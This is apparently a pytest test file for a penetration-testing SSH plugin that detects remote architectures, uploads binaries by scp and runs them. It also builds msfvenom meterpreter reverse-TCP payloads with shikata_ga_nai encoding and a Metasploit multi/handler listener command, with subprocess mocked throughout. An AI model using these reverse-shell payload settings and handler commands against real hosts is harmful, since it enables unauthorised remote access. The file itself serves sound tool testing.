"""Tests for the upload-exec plugin and architecture detection module."""

from __future__ import annotations

from unittest import mock

import pytest

from lazyssh.plugins._arch_detection import (
    ARCH_MAP,
    PLATFORM_MAP,
    RemoteArch,
    detect_remote_arch,
)
from lazyssh.plugins.upload_exec import (
    PAYLOAD_PRESETS,
    MsfvenomConfig,
    _create_staging_dir,
    _scp_upload,
    _show_usage,
    _ssh_exec,
    build_parser,
    generate_msfvenom_payload,
    get_handler_command,
    msfvenom_mode,
    upload_and_execute,
)

# ---------------------------------------------------------------------------
# Architecture Detection Tests
# ---------------------------------------------------------------------------


class TestRemoteArch:
    """Tests for RemoteArch dataclass."""

    def test_basic_creation(self) -> None:
        arch = RemoteArch(raw_arch="x86_64", raw_os="Linux", msf_arch="x64", msf_platform="linux")
        assert arch.raw_arch == "x86_64"
        assert arch.raw_os == "Linux"
        assert arch.msf_arch == "x64"
        assert arch.msf_platform == "linux"

    def test_frozen(self) -> None:
        arch = RemoteArch(raw_arch="x86_64", raw_os="Linux", msf_arch="x64", msf_platform="linux")
        with pytest.raises(AttributeError):
            arch.raw_arch = "arm64"  # type: ignore[misc]


class TestArchMap:
    """Tests for ARCH_MAP completeness."""

    def test_common_architectures(self) -> None:
        assert ARCH_MAP["x86_64"] == "x64"
        assert ARCH_MAP["amd64"] == "x64"
        assert ARCH_MAP["i686"] == "x86"
        assert ARCH_MAP["i386"] == "x86"
        assert ARCH_MAP["aarch64"] == "aarch64"
        assert ARCH_MAP["arm64"] == "aarch64"
        assert ARCH_MAP["armv7l"] == "armle"

    def test_all_entries_nonempty(self) -> None:
        for key, val in ARCH_MAP.items():
            assert key, "ARCH_MAP key must not be empty"
            assert val, "ARCH_MAP value must not be empty"


class TestPlatformMap:
    """Tests for PLATFORM_MAP."""

    def test_common_platforms(self) -> None:
        assert PLATFORM_MAP["linux"] == "linux"
        assert PLATFORM_MAP["darwin"] == "osx"
        assert PLATFORM_MAP["freebsd"] == "bsd"

    def test_all_entries_nonempty(self) -> None:
        for key, val in PLATFORM_MAP.items():
            assert key
            assert val


class TestDetectRemoteArch:
    """Tests for detect_remote_arch function."""

    def test_missing_env_vars(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("LAZYSSH_SOCKET_PATH", raising=False)
        monkeypatch.delenv("LAZYSSH_HOST", raising=False)
        monkeypatch.delenv("LAZYSSH_USER", raising=False)
        with pytest.raises(RuntimeError, match="Missing SSH"):
            detect_remote_arch()

    def test_successful_detection_x86_64(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.delenv("LAZYSSH_PORT", raising=False)

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "x86_64\nLinux\n"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            arch = detect_remote_arch()
            assert arch.raw_arch == "x86_64"
            assert arch.raw_os == "Linux"
            assert arch.msf_arch == "x64"
            assert arch.msf_platform == "linux"

    def test_successful_detection_aarch64(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "aarch64\nLinux\n"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            arch = detect_remote_arch()
            assert arch.raw_arch == "aarch64"
            assert arch.msf_arch == "aarch64"

    def test_with_port(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.setenv("LAZYSSH_PORT", "2222")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "x86_64\nLinux\n"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result) as mock_run:
            detect_remote_arch()
            call_args = mock_run.call_args[0][0]
            assert "-p" in call_args
            assert "2222" in call_args

    def test_explicit_params(self) -> None:
        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "armv7l\nLinux\n"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            arch = detect_remote_arch(socket_path="/tmp/s", host="h", user="u", port="22")
            assert arch.raw_arch == "armv7l"
            assert arch.msf_arch == "armle"

    def test_ssh_failure(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "Connection refused"

        with mock.patch("subprocess.run", return_value=mock_result):
            with pytest.raises(RuntimeError, match="Architecture detection failed"):
                detect_remote_arch()

    def test_timeout(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        with mock.patch(
            "subprocess.run",
            side_effect=__import__("subprocess").TimeoutExpired(["ssh"], 15),
        ):
            with pytest.raises(RuntimeError, match="timed out"):
                detect_remote_arch()

    def test_unexpected_output(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "x86_64\n"  # Only one line, need two
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            with pytest.raises(RuntimeError, match="Unexpected uname"):
                detect_remote_arch()

    def test_unknown_arch_passthrough(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "sparc64\nSunOS\n"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            arch = detect_remote_arch()
            assert arch.raw_arch == "sparc64"
            # Unknown arch passes through as-is
            assert arch.msf_arch == "sparc64"
            assert arch.msf_platform == "solaris"


# ---------------------------------------------------------------------------
# MsfvenomConfig Tests
# ---------------------------------------------------------------------------


class TestMsfvenomConfig:
    """Tests for MsfvenomConfig dataclass."""

    def test_basic_creation(self) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
        )
        assert config.payload == "linux/x64/meterpreter/reverse_tcp"
        assert config.encoder is None
        assert config.iterations == 1

    def test_with_encoder(self) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
            encoder="x86/shikata_ga_nai",
            iterations=3,
        )
        assert config.encoder == "x86/shikata_ga_nai"
        assert config.iterations == 3


class TestPayloadPresets:
    """Tests for PAYLOAD_PRESETS."""

    def test_has_common_arches(self) -> None:
        assert "x64" in PAYLOAD_PRESETS
        assert "x86" in PAYLOAD_PRESETS
        assert "aarch64" in PAYLOAD_PRESETS

    def test_all_presets_nonempty(self) -> None:
        for arch_key, payload in PAYLOAD_PRESETS.items():
            assert arch_key
            assert payload
            assert "meterpreter" in payload


class TestGetHandlerCommand:
    """Tests for get_handler_command."""

    def test_basic_handler(self) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
        )
        handler = get_handler_command(config)
        assert "use exploit/multi/handler" in handler
        assert "set payload linux/x64/meterpreter/reverse_tcp" in handler
        assert "set LHOST 10.0.0.1" in handler
        assert "set LPORT 4444" in handler
        assert "run" in handler


class TestGenerateMsfvenomPayload:
    """Tests for generate_msfvenom_payload."""

    def test_successful_generation(self, tmp_path: pytest.TempPathFactory) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
        )
        output_path = str(tmp_path) + "/payload.elf"  # type: ignore[operator]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            assert generate_msfvenom_payload(config, output_path) is True

    def test_with_encoder(self, tmp_path: pytest.TempPathFactory) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
            encoder="x86/shikata_ga_nai",
            iterations=3,
        )
        output_path = str(tmp_path) + "/payload.elf"  # type: ignore[operator]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result) as mock_run:
            generate_msfvenom_payload(config, output_path)
            call_args = mock_run.call_args[0][0]
            assert "-e" in call_args
            assert "x86/shikata_ga_nai" in call_args
            assert "-i" in call_args
            assert "3" in call_args

    def test_msfvenom_failure(self) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
        )
        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = "Invalid payload"

        with mock.patch("subprocess.run", return_value=mock_result):
            assert generate_msfvenom_payload(config, "/tmp/test.elf") is False

    def test_msfvenom_not_found(self) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
        )
        with mock.patch("subprocess.run", side_effect=FileNotFoundError):
            assert generate_msfvenom_payload(config, "/tmp/test.elf") is False

    def test_msfvenom_timeout(self) -> None:
        config = MsfvenomConfig(
            payload="linux/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="elf",
        )
        with mock.patch(
            "subprocess.run",
            side_effect=__import__("subprocess").TimeoutExpired(["msfvenom"], 120),
        ):
            assert generate_msfvenom_payload(config, "/tmp/test.elf") is False


# ---------------------------------------------------------------------------
# SCP Upload Tests
# ---------------------------------------------------------------------------


class TestScpUpload:
    """Tests for _scp_upload function."""

    def test_missing_env_vars(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("LAZYSSH_SOCKET_PATH", raising=False)
        monkeypatch.delenv("LAZYSSH_HOST", raising=False)
        monkeypatch.delenv("LAZYSSH_USER", raising=False)
        assert _scp_upload("/tmp/local", "/tmp/remote") is False

    def test_successful_upload(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.delenv("LAZYSSH_PORT", raising=False)

        mock_result = mock.MagicMock()
        mock_result.returncode = 0

        with mock.patch("subprocess.run", return_value=mock_result) as mock_run:
            assert _scp_upload("/tmp/local", "/tmp/remote") is True
            call_args = mock_run.call_args[0][0]
            assert "scp" in call_args
            assert "-q" in call_args

    def test_upload_with_port(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.setenv("LAZYSSH_PORT", "2222")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0

        with mock.patch("subprocess.run", return_value=mock_result) as mock_run:
            _scp_upload("/tmp/local", "/tmp/remote")
            call_args = mock_run.call_args[0][0]
            assert "-P" in call_args
            assert "2222" in call_args

    def test_upload_failure(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 1

        with mock.patch("subprocess.run", return_value=mock_result):
            assert _scp_upload("/tmp/local", "/tmp/remote") is False

    def test_upload_timeout(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        with mock.patch(
            "subprocess.run",
            side_effect=__import__("subprocess").TimeoutExpired(["scp"], 120),
        ):
            assert _scp_upload("/tmp/local", "/tmp/remote") is False


# ---------------------------------------------------------------------------
# SSH Exec Tests
# ---------------------------------------------------------------------------


class TestSshExec:
    """Tests for _ssh_exec function."""

    def test_missing_env_vars(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("LAZYSSH_SOCKET_PATH", raising=False)
        monkeypatch.delenv("LAZYSSH_HOST", raising=False)
        monkeypatch.delenv("LAZYSSH_USER", raising=False)
        exit_code, _, stderr = _ssh_exec("echo test")
        assert exit_code == 1
        assert "Missing SSH" in stderr

    def test_successful_exec(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.delenv("LAZYSSH_PORT", raising=False)

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "output"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            exit_code, stdout, stderr = _ssh_exec("echo output")
            assert exit_code == 0
            assert stdout == "output"

    def test_timeout(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        with mock.patch(
            "subprocess.run",
            side_effect=__import__("subprocess").TimeoutExpired(["ssh"], 300),
        ):
            exit_code, _, stderr = _ssh_exec("sleep 999")
            assert exit_code == 1
            assert "timed out" in stderr


# ---------------------------------------------------------------------------
# Upload and Execute Tests
# ---------------------------------------------------------------------------


class TestUploadAndExecute:
    """Tests for upload_and_execute function."""

    def test_file_not_found(self) -> None:
        result = upload_and_execute("/nonexistent/file")
        assert result == 1

    def test_dry_run(self, tmp_path: pytest.TempPathFactory) -> None:
        test_file = str(tmp_path) + "/test_bin"  # type: ignore[operator]
        with open(test_file, "w") as f:
            f.write("#!/bin/sh\necho hello\n")

        result = upload_and_execute(test_file, dry_run=True)
        assert result == 0

    def test_dry_run_with_args(self, tmp_path: pytest.TempPathFactory) -> None:
        test_file = str(tmp_path) + "/test_bin"  # type: ignore[operator]
        with open(test_file, "w") as f:
            f.write("#!/bin/sh\necho hello\n")

        result = upload_and_execute(test_file, remote_args="--flag value", dry_run=True)
        assert result == 0

    def test_staging_dir_failure(
        self, tmp_path: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        test_file = str(tmp_path) + "/test_bin"  # type: ignore[operator]
        with open(test_file, "w") as f:
            f.write("#!/bin/sh\necho hello\n")

        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "permission denied"

        with mock.patch("subprocess.run", return_value=mock_result):
            result = upload_and_execute(test_file)
            assert result == 1

    def test_full_flow_success(
        self, tmp_path: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        test_file = str(tmp_path) + "/test_bin"  # type: ignore[operator]
        with open(test_file, "w") as f:
            f.write("#!/bin/sh\necho hello\n")

        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "hello"
        mock_result.stderr = ""

        with (
            mock.patch("subprocess.run", return_value=mock_result),
            mock.patch("lazyssh.plugins.upload_exec._scp_upload", return_value=True),
        ):
            result = upload_and_execute(test_file)
            assert result == 0

    def test_upload_failure(
        self, tmp_path: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        test_file = str(tmp_path) + "/test_bin"  # type: ignore[operator]
        with open(test_file, "w") as f:
            f.write("#!/bin/sh\necho hello\n")

        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        # First call (staging dir) succeeds, SCP fails
        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with (
            mock.patch("subprocess.run", return_value=mock_result),
            mock.patch("lazyssh.plugins.upload_exec._scp_upload", return_value=False),
        ):
            result = upload_and_execute(test_file)
            assert result == 1

    def test_background_mode(
        self, tmp_path: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        test_file = str(tmp_path) + "/test_bin"  # type: ignore[operator]
        with open(test_file, "w") as f:
            f.write("#!/bin/sh\necho hello\n")

        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with (
            mock.patch("subprocess.run", return_value=mock_result),
            mock.patch("lazyssh.plugins.upload_exec._scp_upload", return_value=True),
        ):
            result = upload_and_execute(test_file, background=True)
            assert result == 0

    def test_output_file(
        self, tmp_path: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        test_file = str(tmp_path) + "/test_bin"  # type: ignore[operator]
        with open(test_file, "w") as f:
            f.write("#!/bin/sh\necho hello\n")

        out_file = str(tmp_path) + "/output.txt"  # type: ignore[operator]

        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "captured output"
        mock_result.stderr = ""

        with (
            mock.patch("subprocess.run", return_value=mock_result),
            mock.patch("lazyssh.plugins.upload_exec._scp_upload", return_value=True),
        ):
            result = upload_and_execute(test_file, output_file=out_file)
            assert result == 0
            with open(out_file) as f:
                assert f.read() == "captured output"


# ---------------------------------------------------------------------------
# Create Staging Dir Tests
# ---------------------------------------------------------------------------


class TestCreateStagingDir:
    """Tests for _create_staging_dir function."""

    def test_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result):
            ok, path = _create_staging_dir()
            assert ok is True
            assert path == "/tmp/.lazyssh_exec"

    def test_failure(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "denied"

        with mock.patch("subprocess.run", return_value=mock_result):
            ok, path = _create_staging_dir()
            assert ok is False
            assert path == ""


# ---------------------------------------------------------------------------
# Msfvenom Mode Tests
# ---------------------------------------------------------------------------


class TestMsfvenomMode:
    """Tests for msfvenom_mode function."""

    def test_msfvenom_not_found(self) -> None:
        arch = RemoteArch("x86_64", "Linux", "x64", "linux")
        with mock.patch("shutil.which", return_value=None):
            result = msfvenom_mode(arch, lhost="10.0.0.1")
            assert result == 1

    def test_no_preset_payload(self) -> None:
        arch = RemoteArch("sparc64", "SunOS", "sparc64", "solaris")
        with mock.patch("shutil.which", return_value="/usr/bin/msfvenom"):
            result = msfvenom_mode(arch, lhost="10.0.0.1")
            assert result == 1

    def test_missing_lhost(self) -> None:
        arch = RemoteArch("x86_64", "Linux", "x64", "linux")
        with mock.patch("shutil.which", return_value="/usr/bin/msfvenom"):
            result = msfvenom_mode(arch)
            assert result == 1

    def test_dry_run(self) -> None:
        arch = RemoteArch("x86_64", "Linux", "x64", "linux")
        with mock.patch("shutil.which", return_value="/usr/bin/msfvenom"):
            result = msfvenom_mode(arch, lhost="10.0.0.1", dry_run=True)
            assert result == 0

    def test_dry_run_with_encoder(self) -> None:
        arch = RemoteArch("x86_64", "Linux", "x64", "linux")
        with mock.patch("shutil.which", return_value="/usr/bin/msfvenom"):
            result = msfvenom_mode(
                arch,
                lhost="10.0.0.1",
                encoder="x86/shikata_ga_nai",
                iterations=3,
                dry_run=True,
            )
            assert result == 0

    def test_payload_generation_failure(self) -> None:
        arch = RemoteArch("x86_64", "Linux", "x64", "linux")
        with (
            mock.patch("shutil.which", return_value="/usr/bin/msfvenom"),
            mock.patch(
                "lazyssh.plugins.upload_exec.generate_msfvenom_payload",
                return_value=False,
            ),
        ):
            result = msfvenom_mode(arch, lhost="10.0.0.1")
            assert result == 1

    def test_full_flow_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
        arch = RemoteArch("x86_64", "Linux", "x64", "linux")
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with (
            mock.patch("shutil.which", return_value="/usr/bin/msfvenom"),
            mock.patch(
                "lazyssh.plugins.upload_exec.generate_msfvenom_payload",
                return_value=True,
            ),
            mock.patch("lazyssh.plugins.upload_exec.upload_and_execute", return_value=0),
        ):
            result = msfvenom_mode(arch, lhost="10.0.0.1", background=True)
            assert result == 0


# ---------------------------------------------------------------------------
# CLI Argument Parsing Tests
# ---------------------------------------------------------------------------


class TestBuildParser:
    """Tests for CLI argument parser."""

    def test_no_args(self) -> None:
        parser = build_parser()
        args = parser.parse_args([])
        assert args.file_path is None
        assert args.msfvenom is False

    def test_file_path(self) -> None:
        parser = build_parser()
        args = parser.parse_args(["/tmp/binary"])
        assert args.file_path == "/tmp/binary"

    def test_msfvenom_flags(self) -> None:
        parser = build_parser()
        args = parser.parse_args(
            [
                "--msfvenom",
                "--lhost",
                "10.0.0.1",
                "--lport",
                "5555",
                "--payload",
                "linux/x64/shell_reverse_tcp",
                "--encoder",
                "x86/shikata_ga_nai",
                "--iterations",
                "3",
                "--format",
                "elf",
            ]
        )
        assert args.msfvenom is True
        assert args.lhost == "10.0.0.1"
        assert args.lport == 5555
        assert args.payload == "linux/x64/shell_reverse_tcp"
        assert args.encoder == "x86/shikata_ga_nai"
        assert args.iterations == 3
        assert args.fmt == "elf"

    def test_execution_flags(self) -> None:
        parser = build_parser()
        args = parser.parse_args(
            [
                "/tmp/binary",
                "--args",
                "--flag value",
                "--no-cleanup",
                "--background",
                "--timeout",
                "60",
                "--output-file",
                "/tmp/out.txt",
                "--dry-run",
            ]
        )
        assert args.file_path == "/tmp/binary"
        assert args.remote_args == "--flag value"
        assert args.no_cleanup is True
        assert args.background is True
        assert args.timeout == 60
        assert args.output_file == "/tmp/out.txt"
        assert args.dry_run is True


# ---------------------------------------------------------------------------
# Show Usage Tests
# ---------------------------------------------------------------------------


class TestShowUsage:
    """Tests for _show_usage function."""

    def test_returns_zero(self) -> None:
        arch = RemoteArch("x86_64", "Linux", "x64", "linux")
        result = _show_usage(arch)
        assert result == 0

    def test_displays_architecture_info(self, capsys: pytest.CaptureFixture[str]) -> None:
        arch = RemoteArch("aarch64", "Linux", "aarch64", "linux")
        _show_usage(arch)
        # Rich writes to its own console, so we check it returns 0 (non-blocking)

    def test_different_architectures(self) -> None:
        for raw, msf in [("x86_64", "x64"), ("armv7l", "armle"), ("aarch64", "aarch64")]:
            arch = RemoteArch(raw, "Linux", msf, "linux")
            assert _show_usage(arch) == 0


# ---------------------------------------------------------------------------
# Plugin Manager LAZYSSH_CONNECTION_DIR Test
# ---------------------------------------------------------------------------


class TestPluginManagerConnectionDir:
    """Tests for LAZYSSH_CONNECTION_DIR env var in plugin manager."""

    def test_connection_dir_in_env(self) -> None:
        from lazyssh.models import SSHConnection
        from lazyssh.plugin_manager import PluginManager

        pm = PluginManager()
        conn = SSHConnection(
            host="testhost",
            port=22,
            username="testuser",
            socket_path="/tmp/testsock",
        )

        env = pm._prepare_plugin_env(conn)
        assert "LAZYSSH_CONNECTION_DIR" in env
        assert "testsock.d" in env["LAZYSSH_CONNECTION_DIR"]
